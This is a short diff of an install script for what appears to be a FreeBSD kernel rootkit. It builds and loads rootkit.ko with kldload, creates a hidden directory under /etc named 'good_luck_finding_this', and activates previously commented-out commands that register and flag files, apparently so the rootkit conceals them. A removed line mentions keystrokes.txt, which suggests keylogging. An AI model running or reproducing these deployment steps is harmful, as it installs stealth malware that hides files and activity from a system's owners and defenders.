@@ -2,14 +2,14 @@
 
 make clean
 make
-mkdir /etc/trivial
+mkdir /etc/good_luck_finding_this
 kldload ./rootkit.ko
-cd ../interact/
+
 cc syscall.c -o syscall
 
-# ./add.sh syscall_number.txt
-# ./setflags.sh syscall_number.txt 01
-# ./add.sh trivial
-# ./setflags.sh trivial 01
-# ./add.sh keystrokes.txt
-# ./setflags.sh keystrokes.txt 01
+./add.sh syscall_number.txt
+./setflags.sh syscall_number.txt 01
+
+./add.sh good_luck_finding_this
+./setflags.sh good_luck_finding_this 01
+
